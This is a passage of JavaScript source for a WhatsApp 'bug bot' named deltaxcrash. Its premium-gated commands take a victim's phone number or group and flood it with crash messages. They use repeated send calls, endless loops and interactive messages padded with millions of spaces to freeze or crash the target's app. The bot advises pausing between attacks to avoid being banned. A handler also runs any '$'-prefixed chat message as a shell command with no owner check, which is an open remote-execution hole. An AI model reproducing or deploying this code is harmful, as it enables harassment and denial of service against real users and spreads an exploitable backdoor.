  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-ui": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'stardust': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'self': {
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
deltaxcrash.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
deltaxcrash.public = true
reply('succes')
}
break
//=================================================//
case 'spiderx': case 'spiderx2': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'deltax3': case 'deltax4': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bug-list': {
if (!isPremium) return reply('_</> Can only be used by premium users..._')

if (!text) return reply(`Example:\n${prefix + command} 254xxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'bug-list': {
if (!isPremium) return reply('_</> Can only be used by premium users..._')

if (!text) return reply(`Example:\n${prefix + command} 254xxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-external': {


if (!isPremium) return reply('_</> Can only be used by premium users..._')

if (!text) return reply(`Example:\n${prefix + command} 254xxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-internal': {


if (!isPremium) return reply('_</> Can only be used by premium users..._')

if (!text) return reply(`Example:\n${prefix + command} 254xxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'bug-engine': {


if (!isPremium) return reply('_</> Can only be used by premium users..._')

if (!text) return reply(`Example:\n${prefix + command} 254xxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-crash': {


if (!isPremium) return reply('_</> Can only be used by premium users..._')

if (!text) return reply(`Example:\n${prefix + command} 254xxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
//=================================================//
case 'virus999': case 'virus-m4': case 'deltax5': case 'clear-data': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'deltacrash ': case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(60000)
}
}
break
case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await deltaxcrash.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `deltaxcrash`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await deltaxcrash.sendMessage(m.chat, { react: { text: '😈', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
        case 'virus-id': {


if (!isPremium) return reply('_</> Can only be used by premium users..._')

if (!text) return reply(`Example:\n${prefix + command} 254xxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
//=================================================//
case 'phone-crash': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
  for (;;) {
    await ngeloc(target, ryobug)
  }
}
break
//=================================================//

case 'gfsCdgsGsGs': case 'reset-gc': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} https://chat.whatsapp.com/`)
reply(`</> Bugs have been sent... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await deltaxcrash.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 crash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(20000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-gc': case 'ui-gc': {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`use .${command} 1962623836281@g.us`)
reply(mess.bugrespon)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #ryozingoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'kill-gc': case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 19626238325471@g.us`)
reply(`</> Bugs have been sent... `)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 crash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(20000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'gfsCdgsGsGs': case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 19626238325471@g.us`)
reply(`</> Bugs have been sent... `)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 crash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "delprem":{
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
if (!args[0]) return reply(`Use ${prefix+command} number\nContact ${prefix+command} 25473123456789`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Number ${ya} Is Not prem`)
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
deltaxcrash.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
